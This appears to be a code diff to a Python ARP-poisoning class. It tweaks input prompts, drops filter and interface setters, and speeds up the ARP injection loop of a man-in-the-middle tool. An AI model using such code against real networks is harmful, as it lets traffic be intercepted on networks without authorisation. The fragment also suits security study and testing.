@@ -21,16 +21,8 @@ class ARP_poisoning:
 
         self.target_ip = input('Enter target IP address :')
         self.gateway_ip = input('Enter gateway IP address :')
-        self.attack_ip = input('Enter target IP address :')
-        self.filter_ = input('Enter target IP address : (ip, tcp ...')
-        self.interface = input('Enter target IP address :')
+        self.attack_ip = input('Enter target attack address :')
 
-
-    def set_filter(self, filter):
-        self.filter_ = filter
-
-    def set_interface(self, interface):
-        self.interface = interface
 
     def set_ipdest(self, ipdest):
         self.target_ip = ipdest
@@ -89,7 +81,7 @@ class ARP_poisoning:
         sys.exit(1)
 
     def poisoning(self):
-
+        self.set_parameters()
         if (self.forward_ip):
             print("\n[*] Enabling IP Forwarding...\n")
         self.start_ip_forward()
@@ -119,7 +111,7 @@ class ARP_poisoning:
         while 1:
             try:
                 self.arp_injection(router_MAC, sensor_MAC)
-                time.sleep(1)
+                time.sleep(0.5)
             # Stop the program and restore the network
             except KeyboardInterrupt:
                 self.restore_arp_tables()
